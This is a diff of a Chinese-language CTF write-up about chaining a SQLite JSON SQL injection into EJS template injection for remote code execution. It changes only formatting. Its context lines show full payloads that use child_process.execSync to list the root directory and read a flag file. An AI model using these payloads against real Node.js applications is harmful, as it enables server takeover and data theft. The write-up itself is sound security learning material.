@@ -19,7 +19,7 @@ Node JS ejs SSTI
 這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
 ![](https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png)
 基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:
-```!
+```
 admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- #
 ```
 後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看[之前寫的文章](https://hackmd.io/@SBK6401/HkgkDNsPp)
@@ -27,7 +27,7 @@ admin.password") as password, json_extract(users, '$.admin.password') as passwor
 ## Exploit - Ejs SSTI RCE
 * Payload 1:
     * Username: 
-        ```!
+        ```
         admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # <%= global.process.mainModule.require("child_process").execSync("ls -al /").toString() %>
         ```
     * Password: `FLAG{sqlite_js0n_inject!on}`
@@ -59,7 +59,7 @@ admin.password") as password, json_extract(users, '$.admin.password') as passwor
         ```
 * Payload 2:
     * Username: 
-        ```!
+        ```
         admin.password") as password, json_extract(users, '$.admin.password') as password from db; -- # <%= global.process.mainModule.require("child_process").execSync("cat /flag2-1PRmDsTXoo3uPCdq.txt").toString() %>
         ```
     * Password: `FLAG{sqlite_js0n_inject!on}`
@@ -78,6 +78,6 @@ Flag: `FLAG{ezzzzz_sqli2ssti}`
 3. 接著就可以開始debug app.js了
 
 ## Reference
-[CTF 中的 EJS 漏洞筆記](https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/?ref=blog.splitline.tw)
-[AIS3-EOF-CTF-2019-Quals - echo WP](https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo)
-[ejs RCE CVE-2022-29078 bypass](https://inhann.top/2023/03/26/ejs/)
+* [CTF 中的 EJS 漏洞筆記](https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/?ref=blog.splitline.tw)
+* [AIS3-EOF-CTF-2019-Quals - echo WP](https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo)
+* [ejs RCE CVE-2022-29078 bypass](https://inhann.top/2023/03/26/ejs/)
